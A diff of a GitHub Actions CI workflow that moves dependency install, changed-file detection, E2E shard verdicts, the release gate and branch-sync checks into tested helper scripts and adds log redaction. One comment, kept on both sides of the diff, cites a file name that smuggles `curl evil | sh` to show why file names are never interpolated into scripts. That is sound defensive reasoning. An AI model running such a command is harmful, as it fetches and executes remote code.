@@ -152,7 +152,7 @@ jobs:
           cache: npm
 
       - name: Install dependencies
-        run: npm ci
+        run: bash scripts/ci/npm-ci.sh
 
       - name: Lint
         run: npx eslint .
@@ -218,7 +218,7 @@ jobs:
           cache: npm
 
       - name: Install dependencies
-        run: npm ci
+        run: bash scripts/ci/npm-ci.sh
 
       - name: Run every migration against an empty database
         run: npm run test:migrations
@@ -294,7 +294,7 @@ jobs:
           cache: npm
 
       - name: Install dependencies
-        run: npm ci
+        run: bash scripts/ci/npm-ci.sh
 
       # Fails in seconds, with the cause named, when Node/Postgres/Redis are not what the suites need
       # (instead of as dozens of unrelated suite failures, or a hang). Prints versions only.
@@ -316,6 +316,9 @@ jobs:
           npm run test:e2e:ci -- --shard=${{ matrix.shard }}/4 2>&1 | tee e2e-results/jest-output.log
           code=${PIPESTATUS[0]}
           set -e
+          # The verdict job reads this file: a shard whose runner dies before this line has no exit-code.txt
+          # and therefore cannot be counted as a pass.
+          echo "$code" > e2e-results/exit-code.txt
           exit "$code"
 
       # Reporting only: runs after a failure too, and never changes the job's verdict (the step above
@@ -335,6 +338,33 @@ jobs:
             name=$(docker inspect --format '{{.Config.Image}}' "$id" | tr '/:' '__')
             if ! docker logs --tail 2000 "$id" > "e2e-results/service-${name}.log" 2>&1; then
               echo "::warning::could not read logs of container ${name}"
+            fi
+          done
+          # Postgres writes an ERROR line for statements the application deliberately survives (a migration
+          # re-adding a constraint that exists, a unique violation a test provokes). Grouping them in the
+          # summary shows which kinds occurred; deadlocks and missing relations are the ones to read.
+          for f in e2e-results/service-postgres_*.log; do
+            [ -e "$f" ] || continue
+            {
+              echo "#### Postgres ERROR lines, shard ${{ matrix.shard }}/4 (grouped)"
+              grep -E ' ERROR: ' "$f" | sed -E 's/^.* ERROR: +//; s/[0-9]+/N/g' | cut -c1-160 | sort | uniq -c | sort -rn | head -15 || true
+            } >> "$GITHUB_STEP_SUMMARY"
+          done
+
+      # Everything uploaded below is masked first (connection strings, bearer tokens, key=value secrets). The
+      # values in CI are synthetic; this keeps it true if that ever changes. A file that cannot be masked is
+      # deleted rather than uploaded raw.
+      - name: Redact diagnostics
+        if: ${{ always() }}
+        run: |
+          for f in e2e-results/*.log e2e-results/*.txt e2e-results/*.xml; do
+            [ -e "$f" ] || continue
+            case "$f" in */exit-code.txt) continue ;; esac
+            if node scripts/ci/redact.mjs < "$f" > "$f.redacted"; then
+              mv "$f.redacted" "$f"
+            else
+              rm -f "$f" "$f.redacted"
+              echo "::warning::could not redact $f; it was not uploaded"
             fi
           done
 
@@ -361,17 +391,15 @@ jobs:
         with:
           persist-credentials: false
 
+      # scripts/ci/e2e-verdict.mjs has no dependencies, so this job needs no `npm ci` (one less network
+      # step on the path to the gate).
       - name: Setup Node.js
         uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
         with:
           node-version: 24
-          cache: npm
-
-      - name: Install dependencies
-        run: npm ci
 
       # A shard that was cancelled or timed out may not have uploaded anything; the absence is reported
-      # below, so a failed download must not hide the verdict step.
+      # by the verdict below, so a failed download must not hide it.
       - name: Download shard results
         if: ${{ always() }}
         uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
@@ -379,27 +407,23 @@ jobs:
           pattern: e2e-shard-*
           path: shard-results
 
-      # Reporting only: a per-shard table in the run summary. The verdict is the next step.
-      - name: Per-shard summary
-        if: ${{ always() }}
-        run: |
-          shopt -s nullglob
-          files=(shard-results/e2e-shard-*/results.json)
-          if [ "${#files[@]}" -eq 0 ]; then
-            echo "No shard result files were uploaded (shards cancelled or failed before jest ran)." >> "$GITHUB_STEP_SUMMARY"
-          else
-            npm run --silent e2e:summary -- --report-only "${files[@]}" >> "$GITHUB_STEP_SUMMARY"
-          fi
-
+      # The verdict needs BOTH the matrix job's own result AND, for every shard 1..4 (the matrix above), a
+      # parsable jest result file that shows work was done and an exit-code.txt of 0. A shard with a missing
+      # or malformed file, zero suites, or a non-zero jest status fails the job, as does a matrix that was
+      # cancelled or skipped. The failed suites/tests and the first lines of their errors (masked) go to the
+      # run summary and the log.
       - name: Require every shard to pass
         if: ${{ always() }}
         env:
           SHARD_RESULT: ${{ needs.e2e-shard.result }}
         run: |
+          failed=0
           if [ "$SHARD_RESULT" != "success" ]; then
-            echo "::error::E2E shards finished as '$SHARD_RESULT', not 'success'. See the per-shard table in the run summary and the e2e-shard-N artifacts."
-            exit 1
+            echo "::error::The E2E shard matrix finished as '$SHARD_RESULT', not 'success'."
+            failed=1
           fi
+          node scripts/ci/e2e-verdict.mjs --dir shard-results --shards 4 --summary-file "$GITHUB_STEP_SUMMARY" || failed=1
+          exit "$failed"
 
   secret-scan:
     name: Secret scanning (gitleaks)
@@ -449,27 +473,19 @@ jobs:
           cache: npm
 
       - name: Install dependencies
-        run: npm ci
+        run: bash scripts/ci/npm-ci.sh
 
-      # Event SHAs come from the `github` context (hex only). File names are NEVER interpolated into the
-      # script: a PR can add a file called `x; curl evil | sh.ts`, so the list is NUL-delimited on disk
-      # and handed to prettier through xargs -0.
+      # Event SHAs come from the `github` context (hex only). File names are NEVER interpolated into a
+      # script: a PR can add a file called `x; curl evil | sh.ts`, so scripts/ci/changed-files.sh writes a
+      # NUL-delimited list and Prettier reads it through xargs -0. The helper fails (it does not report "no
+      # files") when the diff cannot be trusted - unknown head, shallow clone, git error - and handles PR,
+      # push, merge-commit, new-branch and root-commit events; see scripts/ci/tests/changed-files.test.sh.
       - name: Determine changed files
         id: changed
         env:
           BASE_SHA: ${{ github.event.pull_request.base.sha || github.event.before }}
           HEAD_SHA: ${{ github.sha }}
-        run: |
-          BASE="$BASE_SHA"
-          if [ -z "$BASE" ] || ! git cat-file -e "$BASE^{commit}" 2>/dev/null; then
-            BASE=$(git rev-parse HEAD~1 2>/dev/null || echo "")
-          fi
-          if [ -z "$BASE" ]; then
-            echo "count=0" >> "$GITHUB_OUTPUT"
-            exit 0
-          fi
-          git diff -z --name-only --diff-filter=ACMR "$BASE" "$HEAD_SHA" -- '*.ts' '*.tsx' '*.js' '*.jsx' '*.json' '*.md' > "$RUNNER_TEMP/changed-files.z"
-          if [ -s "$RUNNER_TEMP/changed-files.z" ]; then echo "count=1" >> "$GITHUB_OUTPUT"; else echo "count=0" >> "$GITHUB_OUTPUT"; fi
+        run: bash scripts/ci/changed-files.sh "$BASE_SHA" "$HEAD_SHA" "$RUNNER_TEMP/changed-files.z" >> "$GITHUB_OUTPUT"
 
       - name: Prettier --check on changed files
         if: steps.changed.outputs.count != '0'
@@ -521,7 +537,7 @@ jobs:
           cache: npm
 
       - name: Install dependencies
-        run: npm ci
+        run: bash scripts/ci/npm-ci.sh
 
       - name: Validate synthetic staging configuration
         env:
@@ -582,7 +598,7 @@ jobs:
           cache: npm
 
       - name: Install dependencies
-        run: npm ci
+        run: bash scripts/ci/npm-ci.sh
 
       - name: Classify changed migrations
         run: npx ts-node scripts/migration-safety-check.ts --base origin/main
@@ -630,6 +646,18 @@ jobs:
           docker run --rm -v "$PWD:/repo" -w /repo
           rhysd/actionlint@sha256:887a259a5a534f3c4f36cb02dca341673c6089431057242cdc931e9f133147e9 -color
 
+      # actionlint only checks the shell inside `run:`. The logic that decides pass/fail lives in
+      # scripts/ci/*, so those are shellchecked (same pinned image, which ships shellcheck) and run against
+      # throwaway git repositories and fakes.
+      - name: shellcheck scripts/ci
+        run: >-
+          docker run --rm --entrypoint shellcheck -v "$PWD:/repo" -w /repo
+          rhysd/actionlint@sha256:887a259a5a534f3c4f36cb02dca341673c6089431057242cdc931e9f133147e9
+          -x scripts/ci/*.sh scripts/ci/tests/*.sh
+
+      - name: Test scripts/ci
+        run: bash scripts/ci/run-tests.sh
+
 
   # One verdict for "everything that must be green before anything is released". Fails unless EVERY required
   # job succeeded (a skipped or cancelled one is a failure, never a silent pass). migration-safety-check stays
@@ -650,17 +678,22 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
+      - name: Checkout
+        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
+        with:
+          persist-credentials: false
+
+      # scripts/ci/ci-gate.mjs (tested in scripts/ci/tests) passes only if every job below reported `success`.
+      # A required job that is missing from `needs`, an empty or unparsable result list, and any `failure`,
+      # `cancelled` or `skipped` all fail the gate, and the failing jobs are named. ALLOW_SKIPPED is empty on
+      # purpose: every job above runs whenever `control` routes CI, so a skip here is a defect, not a policy.
+      # Keep REQUIRED_JOBS equal to `needs:` above (the gate also fails if a needed job is not listed).
       - name: Require every validation job to pass
         env:
-          RESULTS: ${{ join(needs.*.result, ' ') }}
-        run: |
-          for r in $RESULTS; do
-            if [ "$r" != success ]; then
-              echo "::error::At least one validation job finished as '$r'. Nothing is released from this run."
-              exit 1
-            fi
-          done
-          echo "All validation jobs succeeded."
+          NEEDS_JSON: ${{ toJSON(needs) }}
+          REQUIRED_JOBS: control build-test format-check env-validation migration-chain e2e secret-scan dependency-audit workflow-lint
+          ALLOW_SKIPPED: ''
+        run: node scripts/ci/ci-gate.mjs
 
   # ---------------------------------------------------------------------------------------------------------
   # AWS release. One image (linux/arm64) serves the api, worker and migrate task definitions. It is built with
@@ -729,7 +762,8 @@ jobs:
         with:
           node-version: 24
           cache: npm
-      - run: npm ci
+      - name: Install dependencies
+        run: bash scripts/ci/npm-ci.sh
 
       - name: Classify migration changes
         id: classify
@@ -933,21 +967,12 @@ jobs:
           fetch-depth: 0
           persist-credentials: false
 
+      # No `git fetch` and no token: `fetch-depth: 0` above already brought every branch, and the job keeps
+      # `persist-credentials: false`, so there is nothing to authenticate. (The old explicit
+      # `git fetch origin main develop` had no credentials left to use and failed with "could not read
+      # Username for https://github.com".) The script fails closed if either ref or the full history is
+      # missing. It counts non-merge commits on main that develop lacks (a release merge commit is not a
+      # violation; a cherry-picked merge-back counts as merged) and warns when develop runs far ahead of
+      # main. Tested in scripts/ci/tests.
       - name: main must not be ahead of develop without a merge-back
-        run: |
-          git fetch origin main develop
-          AHEAD=$(git rev-list --count origin/develop..origin/main)
-          if [ "$AHEAD" -gt 0 ]; then
-            echo "::error::main is $AHEAD commit(s) ahead of develop. A hotfix merged to main must be merged back into develop in the same change (see the plan's §11 hotfix procedure)."
-            git log --oneline origin/develop..origin/main
-            exit 1
-          fi
-          echo "main has no commits missing from develop."
-
-      - name: develop should not drift indefinitely without a release
-        run: |
-          BEHIND=$(git rev-list --count origin/main..origin/develop)
-          echo "develop is $BEHIND commit(s) ahead of main (awaiting release)."
-          if [ "$BEHIND" -gt 100 ]; then
-            echo "::warning::develop is $BEHIND commits ahead of main — consider cutting a release. This is a warning, not a failure: a long-lived develop is a process smell, not a safety issue the way main-ahead-of-develop is."
-          fi
+        run: bash scripts/ci/branch-sync-check.sh origin/main origin/develop
